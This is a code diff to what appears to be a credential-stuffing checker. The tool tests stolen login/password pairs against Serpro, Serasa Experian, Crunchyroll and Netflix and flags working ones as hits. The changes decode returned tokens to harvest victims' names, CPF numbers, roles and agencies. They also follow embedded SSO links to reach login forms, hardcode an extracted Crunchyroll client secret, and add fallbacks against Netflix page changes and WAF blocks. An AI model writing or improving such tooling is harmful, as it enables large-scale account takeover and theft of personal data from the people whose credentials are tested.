@@ -477,9 +477,28 @@ async function checkSerpro(login: string, password: string): Promise<CheckResult
     let json: Record<string, unknown>;
     try { json = JSON.parse(text); } catch { return { credential, login, status: "ERROR", detail: "INVALID_JSON" }; }
 
-    // HIT: response contains a JWT token
+    // HIT: response contains a JWT token — decode payload for user details
     if (json.token && typeof json.token === "string") {
-      return { credential, login, status: "HIT", detail: "token_ok" };
+      let detail = "token_ok";
+      try {
+        const pad     = (s: string) => s + "=".repeat((4 - s.length % 4) % 4);
+        const jwtParts = (json.token as string).split(".");
+        if (jwtParts.length === 3) {
+          const pay = JSON.parse(Buffer.from(pad(jwtParts[1]), "base64").toString("utf8")) as Record<string, unknown>;
+          const info: string[] = [];
+          const nome    = String(pay.nome ?? pay.name ?? pay.nomeUsuario ?? "").trim();
+          const cpfJwt  = String(pay.cpf ?? pay.documento ?? pay.sub ?? "").trim();
+          const authArr  = Array.isArray(pay.authorities) ? (pay.authorities as unknown[])[0] : undefined;
+          const perfil  = String(pay.perfil ?? pay.role ?? authArr ?? pay.grupo ?? "").trim();
+          const orgao   = String(pay.orgao ?? pay.unidade ?? pay.siglaSuperior ?? "").trim();
+          if (nome)   info.push(nome.slice(0, 50));
+          if (cpfJwt && cpfJwt !== login) info.push(`cpf:${cpfJwt}`);
+          if (perfil) info.push(`perfil:${perfil.slice(0, 30)}`);
+          if (orgao)  info.push(`orgao:${orgao.slice(0, 30)}`);
+          if (info.length) detail = info.join(" | ");
+        }
+      } catch { /**/ }
+      return { credential, login, status: "HIT", detail };
     }
 
     // Expired / blocked account (has stok but no token)
@@ -1356,7 +1375,7 @@ async function checkSerasa(login: string, password: string): Promise<CheckResult
       return { credential, login, status: "ERROR", detail: `HTTP_${getResult.statusCode}` };
     }
 
-    const html = getResult.body;
+    let html = getResult.body;
 
     // ── Detect if we have a server-rendered login form (SSO/Keycloak) ─────────
     const hasUsernameField = html.includes('id="username"') || html.includes("name=\"username\"") ||
@@ -1364,8 +1383,39 @@ async function checkSerasa(login: string, password: string): Promise<CheckResult
     const hasPasswordField = html.includes('type="password"') || html.includes("type='password'");
 
     if (!hasUsernameField || !hasPasswordField) {
-      // The page is still a JS-only SPA at this point — Selenium would be needed
-      return { credential, login, status: "ERROR", detail: "SELENIUM_REQUIRED:js_only_login" };
+      // SPA page — try to find embedded Keycloak/SSO URL in the JS source
+      const ssoUrlMatch =
+        html.match(/(https:\/\/(?:id|auth)\.serasa(?:experian)?\.com\.br\/auth\/realms\/[^\s"'\\]+?\/protocol\/openid-connect\/auth\?[^"'\\]{10,500})/) ||
+        html.match(/(https:\/\/[a-z0-9.-]*(?:keycloak|auth|id)[a-z0-9.-]*\.serasa[^"'\\]{10,200})/) ||
+        html.match(/"(?:loginUrl|redirectUrl|authUrl|ssoUrl)"\s*:\s*"(https:\/\/[^"]+)"/) ||
+        html.match(/window\.location(?:\.href)?\s*=\s*["'](https:\/\/[^"']+auth[^"']+)["']/) ||
+        html.match(/href=["'](https:\/\/[^"']*(?:auth|id)[^"']*serasaexperian[^"']*)["']/);
+      const ssoUrl = ssoUrlMatch?.[1];
+      if (ssoUrl) {
+        // Follow the embedded SSO URL to reach the real Keycloak login form
+        try {
+          const ssoGet = await runCurl([
+            "-k", "--compressed", "-L", "--max-redirs", "8",
+            "-c", cookieFile, "-b", cookieFile,
+            "-H", `User-Agent: ${DESKTOP_UA}`,
+            "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "-H", "Accept-Language: pt-BR,pt;q=0.9",
+            ssoUrl.replace(/&amp;/g, "&"),
+          ], SERASA_TIMEOUT);
+          const ssoHtml = ssoGet.body;
+          const ssoHasUser = ssoHtml.includes('id="username"') || ssoHtml.includes('name="username"');
+          const ssoHasPw   = ssoHtml.includes('type="password"');
+          if (ssoHasUser && ssoHasPw) {
+            html = ssoHtml; // update to SSO page so form-extraction below works
+          } else {
+            return { credential, login, status: "ERROR", detail: "SELENIUM_REQUIRED:ssr_missing_after_sso" };
+          }
+        } catch {
+          return { credential, login, status: "ERROR", detail: "SELENIUM_REQUIRED:sso_fetch_failed" };
+        }
+      } else {
+        return { credential, login, status: "ERROR", detail: "SELENIUM_REQUIRED:js_only_login" };
+      }
     }
 
     // ── Extract the form action URL (Keycloak uses absolute URLs here) ────────
@@ -1468,7 +1518,8 @@ async function checkSerasa(login: string, password: string): Promise<CheckResult
 //  Routed through residential proxy (cloud IPs blocked / DNS fails)
 //  POST https://auth.crunchyroll.com/auth/v1/token
 // ═══════════════════════════════════════════════════════════════════════════════
-const CR_CLIENT_B64  = Buffer.from("cr_android2:").toString("base64");
+// cr_android2 client — secret is "noakmfxh" per Android APK extraction
+const CR_CLIENT_B64  = Buffer.from("cr_android2:noakmfxh").toString("base64");
 const CR_UA          = "Crunchyroll/3.46.2 Android/13 okhttp/4.12.0";
 const CR_TIMEOUT     = 25_000;
 
@@ -1564,12 +1615,18 @@ async function checkNetflix(login: string, password: string): Promise<CheckResul
     }
 
     const html = getResult.body;
-    const buildMatch = html.match(/"BUILD_IDENTIFIER"\s*:\s*"([^"]+)"/);
-    if (!buildMatch) {
-      if (html.length < 200) return { credential, login, status: "ERROR", detail: "WAF_BLOCKED" };
+    // Multiple regex fallbacks — Netflix rotates JSON key serialization between deploys
+    const buildMatch =
+      html.match(/"BUILD_IDENTIFIER"\s*:\s*"([^"]{4,60})"/) ||
+      html.match(/BUILD_IDENTIFIER["']?\s*:\s*["']([^"']{4,60})["']/) ||
+      html.match(/\\?"BUILD_IDENTIFIER\\?"\s*:\s*\\?"([^"\\]{4,60})\\?"/);
+    // "mre" is Netflix's non-versioned Shakti alias that works when BUILD_IDENTIFIER isn't found
+    const buildId = buildMatch?.[1] ?? "mre";
+    const rawAuthRe = html.match(/"authURL"\s*:\s*"([^"]+)"/);
+    if (!buildMatch && !rawAuthRe) {
+      if (html.length < 500) return { credential, login, status: "ERROR", detail: "WAF_BLOCKED" };
       return { credential, login, status: "ERROR", detail: "NO_BUILD_ID" };
     }
-    const buildId = buildMatch[1];
     // Decode JSON string escapes: \/ → / , \xNN → char, \uNNNN → char
     const rawAuth = (html.match(/"authURL"\s*:\s*"([^"]+)"/) ?? [])[1] ?? "";
     const authURL = rawAuth
